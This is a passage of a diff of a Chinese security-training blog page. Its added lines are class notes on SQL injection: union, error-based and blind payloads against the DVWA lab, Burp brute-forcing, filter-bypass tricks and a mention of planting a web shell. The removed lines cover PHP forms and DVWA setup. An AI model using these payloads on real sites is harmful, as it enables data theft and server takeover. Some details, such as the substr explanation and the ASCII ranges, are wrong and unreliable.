+SELECT score FROM `info` WHERE name=&#39;lilei&#39; waitfor delay &#39;0:0:4’</code></pre>
+<h4 id="时间型盲注的结果判断"><a href="#时间型盲注的结果判断" class="headerlink" title="时间型盲注的结果判断"></a>时间型盲注的结果判断</h4><p>时间型盲注的结果判断主要是根据服务器的响应结果，如果在<strong>加入时间型盲注语句后服务器响应有明显的延时，可以判断SQL注入漏洞存在。</strong>为了排除网络环境影响，可以尝试不同延时量的时间型盲注语句，根据延时的差异进一步进行确认。使用Firefox的firebug插件可以准确的跟踪延时信息。</p>
+<h2 id="课堂笔记"><a href="#课堂笔记" class="headerlink" title="课堂笔记"></a>课堂笔记</h2><h3 id="扩展：正则表达式"><a href="#扩展：正则表达式" class="headerlink" title="扩展：正则表达式"></a>扩展：正则表达式</h3><p>正则表达式(regexp)的主要作用：分割、匹配、查找、替换</p>
+<p>WAF—Web Application Firewall(Web应用防火墙)</p>
+<p>*匹配前一个字符出现0次或者无限次</p>
+<p>?匹配前一个字符出现1次或者0次，即要么有1次，要么没有</p>
+<p>.*任意一个字符可以出现0次或无限次（贪婪匹配，尽可能多地匹配）</p>
+<p>.*?仍然表示任意一个字符可以出现0次或无限次（非贪婪匹配，尽可能少地区匹配）</p>
+<pre><code>正则表达式：.*test.* 在任意字符中匹配test
+test1
+test2
+test3
+3test4</code></pre>
+<pre><code>.*t     匹配结果：123456test #匹配到的是最后一个t，前面的所有内容包括tes都被当做任意字符去匹配，可出现0次或无限次
+.*?t    匹配结果：123456t   #匹配到的是第一个t，前面的123456被当做任意字符
+123456test</code></pre>
+<p>preg_match((.*?),$_GET[‘user’],$return);  //在字符串中查找匹配项，返回一个数组</p>
+<p>preg_replace((.*?),’\\n’,$_GET[‘user’]);    //将查找到的字符串替换成\\n</p>
+<h3 id="SQL注入"><a href="#SQL注入" class="headerlink" title="SQL注入"></a>SQL注入</h3><p>报错注入的测试语句 ‘ “ ) —联合查询、报错</p>
+<p>布尔型 and 1=1 and 1=2 —–布尔型盲注</p>
+<p>时间型 and sleep(5) —-时间型盲注</p>
+<p>步骤：</p>
+<p>1.选择该注入点的注入方式</p>
+<p>2.判断数据库类型</p>
+<p>3.选择漏洞利用的目标，优先选择读写文件</p>
+<p>4.构造SQL语句进行攻击</p>
+<h3 id="SQL注入步骤"><a href="#SQL注入步骤" class="headerlink" title="SQL注入步骤"></a>SQL注入步骤</h3><h4 id="1-对某个网站进行注入，分为四个步骤"><a href="#1-对某个网站进行注入，分为四个步骤" class="headerlink" title="1.对某个网站进行注入，分为四个步骤"></a>1.对某个网站进行注入，分为四个步骤</h4><ul>
+<li>判断闭合类型、使用的语句方法</li>
+<li>判断数据库 —SQL语句判断（表的特征）或者根据网站环境猜测，也可以根据返回的报错信息判断。</li>
+</ul>
+<pre><code>不同数据库的特征：
+mysql information_schema
+sqlserver sysobjects
+oracle dual</code></pre>
+<ul>
+<li>选择利用的操作 – 操作数据/执行命令/读写文件（通过在网站下写一句话木马来控制服务器，但前提是知道网站根目录的绝对路径）</li>
+<li>构造SQL注入语句 – 向数据库发起查询以获取有用的信息。</li>
+</ul>
+<h4 id="2-MySQL手工注入的方式"><a href="#2-MySQL手工注入的方式" class="headerlink" title="2.MySQL手工注入的方式"></a>2.MySQL手工注入的方式</h4><ul>
+<li>联合查询 使用union操作符将两个select语句拼接起来同时在数据库中进行查询，将查询结果显示在页面上。</li>
+<li>报错注入 通过网站的报错信息，某些特殊函数会将函数内的SQL语句进行执行，若该函数出现报错，则会将查询结果返回在页面上。</li>
+<li>布尔型盲注 通过网站不同的回显信息，判断查询语句的正确与否，可以在and后构造SQL语句向数据库发起查询，若后续的SQL语句正确，则返回正常结果，以此获取信息 例如：id=1 and 1=1 返回正常；id=1 and 1=2 返回异常；</li>
+<li>时间型盲注 通过页面的返回时间来判断SQL语句是否正确。若正确，例如在SQL查询语句后加上sleep(5)来判断。</li>
+</ul>
+<h4 id="3-MySQL中如何进行对应的注入"><a href="#3-MySQL中如何进行对应的注入" class="headerlink" title="3.MySQL中如何进行对应的注入"></a>3.MySQL中如何进行对应的注入</h4><ul>
+<li>内置数据库：information_schema</li>
+</ul>
+<pre><code>内置表schemata，存放数据库名
+内置表tables，存放表名和数据库名的对应关系
+内置表columns，存放了字段名和表名、数据库名的对应关系</code></pre>
+<ul>
+<li>联合查询</li>
+</ul>
+<pre><code>order by 以查询结果中的某一列进行排序。若该列不存在，则会产生报错。
+union select 使用union操作符将前后两个select语句放在数据库中同时查询（union操作符前后的select语句列数、字符类型需要相等）由于MySQL是弱类型数据库，故不需要字符类型相同。</code></pre>
+<h4 id="4-联合查询的流程"><a href="#4-联合查询的流程" class="headerlink" title="4.联合查询的流程"></a>4.联合查询的流程</h4><ul>
+<li>判断可以注入的方式以及该注入点的闭合形式</li>
+<li>判断前一个SQL语句查询的列数（order by）</li>
+</ul>
+<pre><code>例如对dvwa的注入过程：
+单引号字符型
+联合查询 报错注入 盲注
+判断前一个查询语句查询了两列
+判断数据的回显位置（把前面的SQL参数置空，在后面使用union select 1,2来判断回显位置）
+说明union select查询的两个字段都会显示在页面上，则可以在1和2的位置构造SQL语句向数据库发起查询。
+将查询结果放在一行显示用group_concat()函数。
+编码问题convert--用来解决查询时的编码问题。该函数可以修改当前数据库的查询编码convert(colname using latin1)
+获取数据库名、表名和列名后查询数据,查询user和password字段的值：
+-1&#39; union select user,password form dvwa.users;</code></pre>
+<ul>
+<li>union select查询数据库、表、字段、数据的信息</li>
+</ul>
+<h5 id="扩展"><a href="#扩展" class="headerlink" title="扩展"></a>扩展</h5><p>EXP:exploit 攻击脚本–如何利用该漏洞执行特定的效果(操作数据、控制系统)–有害的</p>
+<pre><code>-1&#39; union select database(),group_concat(convert(schema_name using latin1)) from information_schema.schemata#;获取当前数据库名和网站数据库中的所有数据库名</code></pre>
+<p>PoC：Proof of Concept观点证明–证明该漏洞存在 —无害的</p>
+<pre><code>1&#39; union select 1,2#      可以发现存在的漏洞</code></pre>
+<h4 id="5-报错注入、盲注的流程"><a href="#5-报错注入、盲注的流程" class="headerlink" title="5.报错注入、盲注的流程"></a>5.报错注入、盲注的流程</h4><ul>
+<li>判断注入方式及闭合形式（不需要判断前一个SQL语句查询的列数。）</li>
+<li>使用特定语法进行注入，查询数据库、表、字段、数据的信息</li>
+</ul>
+<pre><code>报错注入函数
+extractvalue(value,path)--如果在path位置构造一个SQL语句，这个语句会先将被数据库进行执行。若path位置存在错误，则extractvalue函数会产生报错，将报错信息显示在页面上。该函数存在吃字符现象，无法完全显示报错的返回结果。
+报错注入的重点：在path的位置构造一个子句</code></pre>
+<ul>
+<li>limit(m,n)从第m行开始，查询后n行的数据。</li>
+</ul>
+<pre><code>limit(0,1) //从第0行开始，向后查询1行。也就是只查询第1行
+limit(5,3) //从第5行开始，向后查询3行。也就是查询6,7,8行。</code></pre>
+<h4 id="6-盲注"><a href="#6-盲注" class="headerlink" title="6.盲注"></a>6.盲注</h4><p>（1）核心思想：根据页面是否正常返回结果来判断后面构造的SQL语句是否正确。</p>
+<pre><code>select * from users where user_id=&quot;1&quot; and (select database())=&quot;dvwa&quot;;</code></pre>
+<p>（2）截断函数left()</p>
+<pre><code>select * from users where user_id=&quot;1&quot; and (select left(database(),1))=char(97);</code></pre>
+<p>（3）substr(string,m,n) ，该函数可返回字符串的一部分。例如，substr(string,1,1)返回从第1个到第3个字符。substr(string,2,1)表示从第2个字符开始，返回1个字符；也就是返回第2个字符</p>
+<pre><code>爆破思想：只改变m和等号后面的字符
+id=1 and (select substr(database(),1,1))=&quot;a&quot;
+id=1 and substr(database(),2,1)=&quot;d&quot;
+id=1 and substr(database(),3,1)=&quot;m&quot;
+id=1 and substr(database(),4,1)=&quot;i&quot;
+id=1 and substr(database(),5,1)=&quot;n&quot;</code></pre>
+<p>（4）regexp+‘正则表达式’</p>
+<pre><code>id=1 and (select database() regexp=&#39;^a&#39;) //^表示匹配前面字符串的第一个字符。
+id=1 and (select database() regexp=&#39;^ad&#39;) //^表示匹配前面字符串的前两个字符。</code></pre>
+<p>（5）length()</p>
+<pre><code>1&#39; and (select length(database())&lt;10)</code></pre>
+<p>（6）步骤：</p>
+<ul>
+<li>获取当前需要查询的内容的长度</li>
+<li>根据对应的长度进行每一位字符的爆破</li>
+</ul>
+<p>（7）常用工具：Burp Suite。爆破时可能会存在符号编码问题(例如引号、空格无法识别），可在网页中提交时用burp抓包后发送到Intruder再标记要爆破的内容。</p>
+<pre><code>1&#39; and (select substr(database(),1,1)=char(97))#
+1&#39; and (select substr(database(),2,1)=char(97))#
+1&#39; and (select substr(database(),3,1)=char(97))#
+1&#39; and (select substr(database(),4,1)=char(97))#
+1&#39; and (select substr(database(),1,1)=char(98))#
+1&#39; and (select substr(database(),2,1)=char(98))#
+......</code></pre>
+<p>逗号的ASCII码为44，可用此来区分返回结果中的不同数据库名称、表名、字段名、数据。</p>
+<p>字母a-z：97-122，MySQL对大小写不敏感</p>
+<p>数字0-1:448-57</p>
+<p>下划线：95</p>
+<p><strong>时间型盲注</strong>：</p>
+<p>if()函数。</p>
+<pre><code>#1=1是条件，success为条件成立时的操作，failed为条件不成立的操作
+select if(1=1,&quot;success&quot;,&quot;failed&quot;) 
+select if(&quot;sql语句&quot;=&quot;值&quot;,sleep(3),0)
 
-&lt;/body&gt; 
-&lt;/html&gt;</code></pre>
-<p><img src="https://i.loli.net/2020/12/26/4bSYiJCj9IGBHms.png" alt="image-20201226221946820"></p>
-<h3 id="PHP的表单处理"><a href="#PHP的表单处理" class="headerlink" title="PHP的表单处理"></a>PHP的表单处理</h3><h4 id="在HTML上触发GET请求"><a href="#在HTML上触发GET请求" class="headerlink" title="在HTML上触发GET请求"></a>在HTML上触发GET请求</h4><p>（1）HTML可以采用A标签或form表单的形式触发get请求，从带有get方法的表单发送的信息会显示在浏览器的地址栏，并且对发送信息的量也有限制。使用A标签触发get请求时，请求的参数值是固定的。</p>
-<pre><code class="HTML">&lt;!--a标签触发get请求--&gt;
-&lt;html&gt;
-    &lt;head&gt;
-        &lt;meta charset=&quot;utf-8&quot;&gt;
-        &lt;title&gt;GET请求&lt;/title&gt;
-    &lt;/head&gt;
-    &lt;body&gt;
-        &lt;a href= &quot;get.php?fname=dayang&amp;age=24&quot;&gt;提交请求&lt;/a&gt;
-    &lt;/body&gt;
-&lt;/html&gt;</code></pre>
-<p><img src="https://i.loli.net/2020/12/26/l2r7OuaxcVoyLjT.png" alt="image-20201226223120376"></p>
-<p><img src="https://i.loli.net/2020/12/26/EHOnCwqbfkh8FpT.png" alt="image-20201226223157764"></p>
-<p>（2）form表单触发GET请求</p>
-<pre><code class="html">&lt;html&gt;
-    &lt;head&gt;
-        &lt;meta charset=&quot;urf-8&quot;&gt;
-        &lt;title&gt;GET请求&lt;/title&gt;
-    &lt;/head&gt;
-    &lt;body&gt;
-        &lt;!--请求目标页面为get.php,请求方式为get--&gt; 
-        &lt;form action=&quot;get.php&quot; method=&quot;get&quot;&gt;             
-            名字:&lt;input type=&quot;text&quot; name=&quot;fname&quot;&gt;
-            年龄:&lt;input type=&quot;text&quot; name=&quot;age&quot;&gt;
-            &lt;input type=&quot;submit&quot; value=&quot;提交&quot;&gt;
-        &lt;/form&gt;
-    &lt;/body&gt;
-&lt;/html&gt;</code></pre>
-<p><img src="https://i.loli.net/2020/12/26/qgwT4RVxsoBFXfS.png" alt="image-20201226225025070"></p>
-<h4 id="GET请求的处理"><a href="#GET请求的处理" class="headerlink" title="GET请求的处理"></a>GET请求的处理</h4><p>$_GET变量用于收集HTTP GET请求中的参数值。服务端处理</p>
-<pre><code class="php">欢迎&lt;?php echo $_GET[&quot;fname&quot;];?&gt;!&lt;br&gt;
-你的年龄是&lt;?php echo $_GET[&quot;age&quot;];?&gt;岁。</code></pre>
-<p><img src="https://i.loli.net/2020/12/26/4sZ7hPrbRnqTIva.png" alt="image-20201226231005000"></p>
-<h4 id="在HTML上触发POST请求"><a href="#在HTML上触发POST请求" class="headerlink" title="在HTML上触发POST请求"></a>在HTML上触发POST请求</h4><p>（1）HTML可以采用form表单的形式触发POST请求，从带有POST方法的表单发送的数据，不会显示在浏览器的地址栏，并且对发送信息的量也没有限制，常用于传输敏感数据或较大量的数据。</p>
-<p>（2）实例：form表单触发POST请求</p>
-<pre><code class="html">&lt;html&gt;
-    &lt;head&gt;
-        &lt;meta charset=&quot;utf-8&quot;&gt;
-        &lt;title&gt;POST请求&lt;/title&gt;
-    &lt;/head&gt;
-    &lt;body&gt;
-        &lt;form action=&quot;post.php&quot; method=&quot;post&quot;&gt;
-            名字:&lt;input type=&quot;text&quot; name=&quot;fname&quot;&gt;
-            年龄:&lt;input type=&quot;text&quot; name=&quot;age&quot;&gt;
-            &lt;input type=&quot;submit&quot; value=&quot;提交&quot;&gt;
-        &lt;/form&gt;
-    &lt;/body&gt;
-&lt;/html&gt;</code></pre>
-<h4 id="POST请求的处理"><a href="#POST请求的处理" class="headerlink" title="POST请求的处理"></a>POST请求的处理</h4><p>$_POST变量用于收集来自HTTP POST请求中的参数值</p>
-<pre><code class="php">欢迎&lt;?php echo $_POST[&quot;fname&quot;];?&gt;!&lt;br&gt;
-你的年龄是&lt;?php echo $_POST[&quot;age&quot;];?&gt;岁。</code></pre>
-<h2 id="数据库与SQL基础"><a href="#数据库与SQL基础" class="headerlink" title="数据库与SQL基础"></a>数据库与SQL基础</h2><h3 id="数据库系统基本概念"><a href="#数据库系统基本概念" class="headerlink" title="数据库系统基本概念"></a>数据库系统基本概念</h3><p>（1）数据库：长期存储在计算机内、有组织的、可共享的数据集合</p>
-<p>（2）DBMS(DataBase Management Ssytem):一种操纵和管理数据库的大型软件，用于建立、使用和维护数据库，它对数据库进行统一的管理和控制，以保证数据库的安全性和完整性。常见的DBMS包括access、sqlserver、mysql、oracle、DB2等。</p>
-<h3 id="关系型数据库系统特点"><a href="#关系型数据库系统特点" class="headerlink" title="关系型数据库系统特点"></a>关系型数据库系统特点</h3><p>（1）数据结构化和共享性：库、表、字段；结构化查询(SQL)</p>
-<p>（2）数据独立性：物理独立性，逻辑独立性</p>
-<p>（3）数据的完整性约束：</p>
-<p>实体完整性(通过主键约束条件)</p>
-<p>参照完整性(通过主外键约束条件)</p>
-<p>用户自定义完整性(通过CHECK子句)</p>
-<p>（4）数据由DBMS统一管理和控制：查询引擎、事务控制、数据存储模块/组件</p>
-<p><img src="https://i.loli.net/2020/12/26/1bK2sX6JWvpFoCQ.png" alt="image-20201226234112089"></p>
-<h3 id="SQL"><a href="#SQL" class="headerlink" title="SQL"></a>SQL</h3><p>（1）概念：SQL语言，是结构化查询语言(Structured Query Language)的简称。SQL语言是一种数据库查询和程序设计语言，用于存储数据以及查询、更新和管理关系数据库系统；同时也是数据库脚本文件的扩展名。</p>
-<p>（2）SQL语句格式：在数据库上执行的大部分工作都由SQL语句完成。注意：SQL对大小写不敏感。#和–后的内容代表注释，在浏览器中–要写为–+</p>
-<p><img src="https://i.loli.net/2020/12/26/p6QNkLcKsZrwg5i.png" alt="image-20201226234657011"></p>
-<h4 id="SELECT语句——基本查询"><a href="#SELECT语句——基本查询" class="headerlink" title="SELECT语句——基本查询"></a>SELECT语句——基本查询</h4><p>（1）cmd进入mysql数据库，前提是设置好环境变量在PATH里面添加D:\SecurityTools\WebTools\phpstudy\PHPTutorial\MySQL\bin</p>
-<p>然后运行cmd命令窗口，输入：mysql -u root -p，回车后输入密码即可进入数据库。</p>
-<p>或者直接用phpstudy打开：其他选项菜单–&gt;MySQL工具–&gt;MySQL命令行</p>
-<p>（2）基本查询：</p>
-<pre><code>show databases;      //查询数据库有哪些
-use mysql;           //进入或使用mysql数据库  
-show tables;         //查询mysql数据库中的表</code></pre>
-<p><img src="https://i.loli.net/2020/12/27/WUZ3eGvINQJCnlT.png" alt="image-20201227001655078"></p>
-<h4 id="SELECT语句——AND和OR运算"><a href="#SELECT语句——AND和OR运算" class="headerlink" title="SELECT语句——AND和OR运算"></a>SELECT语句——AND和OR运算</h4><p>（1）AND运算：AND分隔的表达式须同时满足</p>
-<p>（2）OR运算：OR分隔的表达式只需要满足任意一个</p>
-<p><img src="https://i.loli.net/2020/12/27/M9dc7NvyPGBaUbg.png" alt="image-20201227002419442"></p>
-<p><img src="https://i.loli.net/2020/12/27/onBa1mAVIOLfM85.png" alt="image-20201227002127380"></p>
-<p>（3）当AND和OR运算符同时出现时，先进行AND运算，再进行OR运算。优先级=大于and大于or</p>
-<p><img src="https://i.loli.net/2020/12/27/PxGFUetMfmglOI4.png" alt="image-20201227002245210"></p>
-<h2 id="动态页面的工作原理"><a href="#动态页面的工作原理" class="headerlink" title="动态页面的工作原理"></a>动态页面的工作原理</h2><h3 id="动态页面工作流程理解——数据查询"><a href="#动态页面工作流程理解——数据查询" class="headerlink" title="动态页面工作流程理解——数据查询"></a>动态页面工作流程理解——数据查询</h3><p><img src="https://i.loli.net/2020/12/27/9bBDrMq2fA3JXKh.png" alt="image-20201227002758895"></p>
-<p><img src="https://i.loli.net/2020/12/27/SFuhmXac5DQ48E2.png" alt="image-20201227002850094"></p>
-<h4 id="系统登录成功"><a href="#系统登录成功" class="headerlink" title="系统登录成功"></a>系统登录成功</h4><p><img src="https://i.loli.net/2020/12/27/2F3X5vh1WozLGVT.png" alt="image-20201227003308006"></p>
-<h4 id="系统登录失败"><a href="#系统登录失败" class="headerlink" title="系统登录失败"></a>系统登录失败</h4><p><img src="https://i.loli.net/2020/12/27/WgMJ64cFa8hvl5B.png" alt="image-20201227003345200"></p>
-<h3 id="动态网站搭建——DVWA"><a href="#动态网站搭建——DVWA" class="headerlink" title="动态网站搭建——DVWA"></a>动态网站搭建——DVWA</h3><p>（1）首先将DVWA的源代码放进D:\SecurityTools\WebTools\phpstudy\PHPTutorial\WWW中，然后解压DVWA的压缩包。</p>
-<p>（2）配置DVWA链接数据库，打开config文件夹，打开config.inc.php。(注意需要将文件类型改为php)</p>
-<p>（3）需要把db_password修改成root，因为刚安装好的集成环境默认的MySQL连接用户名和密码为root和root。</p>
-<p><img src="https://i.loli.net/2020/12/27/gsv5e4f6WkrwUTN.png" alt="image-20201227004006196"></p>
-<p>（4）登录DVWA，在浏览器地址栏输入127.0.0.1/DVWA/index.php访问</p>
-<p>（5）点击Create/Reset Database后，再次访问。登录初始账号admin，密码password</p>
-<p><img src="https://i.loli.net/2020/12/27/JYNCheTFMkK2wzi.png" alt="image-20201227005759025"></p>
-<p><img src="https://i.loli.net/2020/12/27/N8xrA5q2wlM3eK6.png" alt="image-20201227005235895"></p>
-<h2 id="Burp暴力破解"><a href="#Burp暴力破解" class="headerlink" title="Burp暴力破解"></a>Burp暴力破解</h2><p>暴力破解一般指穷举法，穷举法的基本思想是根据题目的部分条件确定答案的大致范围，并在此范围内对所有可能的情况逐一验证，直到全部情况验证完毕。若某个情况验证符合题目的全部条件，则为本问题的一个解；若全部情况验证后都不符合题目的全部条件，则本题无解。穷举法也称枚举法。</p>
-<h3 id="Burpsuite模块——Intruder模块详解"><a href="#Burpsuite模块——Intruder模块详解" class="headerlink" title="Burpsuite模块——Intruder模块详解"></a>Burpsuite模块——Intruder模块详解</h3><p>（1）Burp Intruder用于自动对Web应用程序自定义的攻击</p>
-<p>（2）Burp Intruder是高度可配置的，并被用来广范围内进行自动化攻击。可以枚举标识符，获取有用数据，漏洞模糊测试。</p>
-<p>（3）合适的攻击类型取决于应用程序的情况，可能包括：</p>
-<p>缺陷测试：SQL注入，跨站点脚本攻击，缓冲区溢出，路径遍历，暴力攻击认证系统，枚举，操纵参数，拖出隐藏的内容和功能，会话令牌测序和会话劫持，数据挖掘，并发攻击，应用层的拒绝服务式攻击。</p>
-<h4 id="模块说明"><a href="#模块说明" class="headerlink" title="模块说明"></a>模块说明</h4><p>（1）Target用于配置目标服务器进行攻击的详细信息</p>
-<p><img src="https://i.loli.net/2020/12/27/pvnqcXkR5i3WDsU.png" alt="image-20201227010741048"></p>
-<p>（2）Positions设置Payloads的插入点以及攻击类型(攻击模式)</p>
-<p>攻击模式：</p>
-<p>sniper：单个字典，单个变量，若有多个变量，对变量依次进行破解。多个标记依次进行。</p>
-<p>Battering ram：多个变量设置一个字典，对变量同时进行破解。多个标记同时进行。</p>
-<p>Pitchfork：每一个变量标记对应一个字典，取每个字典对应项。</p>
-<p>Cluster bomb：每个变量对应一个字典，并且进行交集破解，尝试各种组合。适合用于用户名+密码的破解。</p>
-<p><img src="https://i.loli.net/2020/12/27/PjUBe1bpnXo6wiE.png" alt="image-20201227011237538"></p>
-<p>（3）Payloads设置payload，配置字典</p>
-<p><img src="https://i.loli.net/2020/12/27/h3VcGn6eXlEgOUt.png" alt="image-20201227011344398"></p>
-<h4 id="暴力破解——DVWA"><a href="#暴力破解——DVWA" class="headerlink" title="暴力破解——DVWA"></a>暴力破解——DVWA</h4><p>（1）访问DVWA的地址，点击Brute Force</p>
-<p><img src="https://i.loli.net/2020/12/27/uZomrbMh7LBjIdY.png" alt="image-20201227011547962"></p>
-<p>（2）随便输入用户名，密码，浏览器开启代理后，用burp抓包</p>
-<p>（3）将抓到的包发送到Intruder模块</p>
-<p>（4）设置好目标端口，攻击方式选择Cluster bomb</p>
-<p><img src="https://i.loli.net/2020/12/27/HEwQZUdjAmqLbih.png" alt="image-20201227011758916"></p>
-<p>（5）删除$之后，进入payloads模块，添加密码本，也就是要进行暴力破解时依次验证的每个密码。</p>
-<p>（6）全部设置完后，点击star attck 开始攻击</p>
-<p>（7）在弹出的框中，寻找与其他长度不符合的payload，该payload就是最终破解出来的密码，可以点击”length”排序后快速查找。</p>
-<p><img src="C:\Users\86177\AppData\Roaming\Typora\typora-user-images\image-20201227012152047.png" alt="image-20201227012152047"></p>
+?id=1&#39; and if(left(database(),1)=&#39;a&#39;,sleep(3),0)</code></pre>
+<p>**注：</p>
+<ul>
+<li>单引号、双引号被过滤，用char()、十六进制。</li>
+<li>substr()被过滤，用left()、mid()、regexp()、like()</li>
+<li>extractvalue()被过滤，用updataxml()、floor()、exp()</li>
+<li>在单引号、双引号前加了转义符，则用宽字节注入 引号前加%df</li>
+<li>过滤了union、select、where等字符串</li>
+</ul>
+<pre><code>将关键字替换成了空字符，
+1.这时可用双写绕过，ununionion
+2.大小写绕过，UnioN</code></pre>
+<ul>
+<li>过滤空格</li>
+</ul>
+<pre><code>将空格替换成了空字符
+1./**/
+2.0x09
+3.&#123;$IFS&#125; （在Linux中，代表一个空格）</code></pre>
+<ul>
+<li>宽字节注入、堆叠注入</li>
+</ul>
+<p>单引号字符型，可以进行联合查询和报错注入</p>
+<p>1.数据库名 select database();</p>
+<p>2表名</p>
+<p>3.字段名</p>
+<p>mysql 内置数据库：imformation_schema,该数据库默认的三张表schemata、tables、columns</p>
+<p>数据表：</p>
+<p>1.schemata  schema_name属性存放所有数据库名</p>
+<p>2.tables     table_name 存放表名</p>
+<p>3.columns column_name 存放列名</p>
+<pre><code>#在imformation_schema数据库中的schemata表中查询数据库名称为dvwa的数据库
+select schema_name from information_schema.schemata where schema_name=&quot;dvwa&quot;; 
+
+#在information_schema数据库中的tables表中查询数据库名称为dvwa的所有的表的名称
+select table_name from information_schema.TABLES where table_schema=&quot;dvwa&quot;; 
+
+#在information_schema数据库中的columns表中查询数据库名称为dvwa的users表的的所有字段
+select column_name from information_schema.columns where table_schema=&quot;dvwa&quot; and table_name=&quot;users&quot;; </code></pre>
+<p>union特性：前后的select语句的列数必须一致 —-需要知道网站构造的SQL语句查询了几个字段</p>
+<pre><code>1&#39; union select 1,2#         字符型
+1 union select 1,2           数字型</code></pre>
+<p> 查询时一般让union前的SQL语句执行结果置空，转而执行union后面的select查询语句。</p>
+<pre><code>-1&#39; union select 1,2#
+#convert(xxx using latin1) 进行编码转化,避免查询的前后两个字段编码不同。
+select 1,convert(table_name using latin1) from information_schema.TABLES where table_schema=&quot;dvwa&quot;;
+
+#group_concat()函数，将查询的结果放在一行显示
+select 1,group_concat(convert(table_name using latin1)) from information_schema.TABLES where table_schema=&quot;dvwa&quot;;</code></pre>
+<p>order by  x 以x列进行排序</p>
+<p>若order by 3显示正常，order by 4显示异常，则代表有3列</p>
+<p>用order by判断列数时可借助二分法的思想快速判断。</p>
+<pre><code>1&#39; order by 4 --+            字符型
+1 order by 4                 数字型</code></pre>
+<h3 id="扩展：Windows下的命令"><a href="#扩展：Windows下的命令" class="headerlink" title="扩展：Windows下的命令"></a>扩展：Windows下的命令</h3><pre><code>netstat -ano | findstr &quot;8080&quot;   //查询8080端口是否被占用
+tasklist /svc | findstr 9940   //查询9940这个进程</code></pre>
 
       
 
@@ -418,7 +606,7 @@ show tables;         //查询mysql数据库中的表</code></pre>
 		<ul class="article-tag-list">
 			 
         		<li class="article-tag-list-item">
-        			<a href="javascript:void(0)" class="js-tag article-tag-list-link color5">安全初级</a>
+        			<a href="javascript:void(0)" class="js-tag article-tag-list-link color5">安全进阶</a>
         		</li>
       		
 		</ul>
@@ -474,7 +662,7 @@ show tables;         //查询mysql数据库中的表</code></pre>
     <a class="close js-modal-close" href="javascript:;"><i class="icon icon-close"></i></a>
     <p>扫一扫，分享到微信</p>
     <div class="wx-qrcode">
-      <img src="//pan.baidu.com/share/qrcode?url=http://example.com/2020/12/26/%E5%AE%89%E5%85%A8%E5%88%9D%E7%BA%A7/WEB%E5%AE%89%E5%85%A8%E5%9F%BA%E7%A1%80(%E4%BA%8C)/" alt="微信分享二维码">
+      <img src="//pan.baidu.com/share/qrcode?url=http://example.com/2021/04/18/%E5%AE%89%E5%85%A8%E8%BF%9B%E9%98%B6/SQL%E6%B3%A8%E5%85%A5%E5%8E%9F%E7%90%86%E4%B8%8E%E5%AE%9E%E8%B7%B5%E8%BF%9B%E9%98%B6/" alt="微信分享二维码">
     </div>
 </div>
 
@@ -488,18 +676,18 @@ show tables;         //查询mysql数据库中的表</code></pre>
   
 <nav id="article-nav">
   
-    <a href="/2020/12/27/%E5%AE%89%E5%85%A8%E5%88%9D%E7%BA%A7/SQL%E6%B3%A8%E5%85%A5%E7%9A%84%E5%8E%9F%E7%90%86%E4%B8%8E%E5%88%A9%E7%94%A8/" id="article-nav-newer" class="article-nav-link-wrap">
+    <a href="/2021/04/18/Python/%E8%BF%90%E7%94%A8Python%E8%AF%AD%E8%A8%80(%E4%BA%94)-%E7%BD%91%E7%BB%9C%E7%88%AC%E8%99%AB%E5%92%8C%E8%87%AA%E5%8A%A8%E5%8C%9601/" id="article-nav-newer" class="article-nav-link-wrap">
       <i class="icon-circle-left"></i>
       <div class="article-nav-title">
         
-          SQL注入的原理与利用
+          运用Python语言(五)-网络爬虫和自动化01
         
       </div>
     </a>
   
   
-    <a href="/2020/12/15/%E5%AE%89%E5%85%A8%E5%88%9D%E7%BA%A7/WEB%E5%AE%89%E5%85%A8%E5%9F%BA%E7%A1%80(%E4%B8%80)/" id="article-nav-older" class="article-nav-link-wrap">
-      <div class="article-nav-title">WEB安全基础(一)</div>
+    <a href="/2021/04/16/Python/%E8%BF%90%E7%94%A8Python%E8%AF%AD%E8%A8%80(%E5%9B%9B)-%E7%A7%91%E5%AD%A6%E8%AE%A1%E7%AE%97%E5%92%8C%E5%8F%AF%E8%A7%86%E5%8C%9602/" id="article-nav-older" class="article-nav-link-wrap">
+      <div class="article-nav-title">运用Python语言(四)-科学计算和可视化02</div>
       <i class="icon-circle-right"></i>
     </a>
   
@@ -526,7 +714,7 @@ show tables;         //查询mysql数据库中的表</code></pre>
                 </span>
                 <span class="tooltip-content">
                     <div class="toc-article">
-                    <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%9C%8D%E5%8A%A1%E7%AB%AF%E8%84%9A%E6%9C%AC%E5%9F%BA%E7%A1%80"><span class="toc-number">1.</span> <span class="toc-text">服务端脚本基础</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E9%9D%99%E6%80%81%E7%BD%91%E9%A1%B5%E4%B8%8E%E5%8A%A8%E6%80%81%E7%BD%91%E9%A1%B5"><span class="toc-number">1.1.</span> <span class="toc-text">静态网页与动态网页</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%B8%B8%E8%A7%81%E7%9A%84%E6%9C%8D%E5%8A%A1%E7%AB%AF%E8%84%9A%E6%9C%AC%E8%AF%AD%E8%A8%80"><span class="toc-number">1.2.</span> <span class="toc-text">常见的服务端脚本语言</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#PHP%E8%AF%AD%E6%B3%95%E5%9F%BA%E7%A1%80"><span class="toc-number">1.3.</span> <span class="toc-text">PHP语法基础</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#PHP%E8%BE%93%E5%87%BA"><span class="toc-number">1.4.</span> <span class="toc-text">PHP输出</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#PHP%E4%B8%8EHTML%E7%BB%93%E5%90%88"><span class="toc-number">1.5.</span> <span class="toc-text">PHP与HTML结合</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#PHP%E7%9A%84%E8%A1%A8%E5%8D%95%E5%A4%84%E7%90%86"><span class="toc-number">1.6.</span> <span class="toc-text">PHP的表单处理</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%9C%A8HTML%E4%B8%8A%E8%A7%A6%E5%8F%91GET%E8%AF%B7%E6%B1%82"><span class="toc-number">1.6.1.</span> <span class="toc-text">在HTML上触发GET请求</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#GET%E8%AF%B7%E6%B1%82%E7%9A%84%E5%A4%84%E7%90%86"><span class="toc-number">1.6.2.</span> <span class="toc-text">GET请求的处理</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" 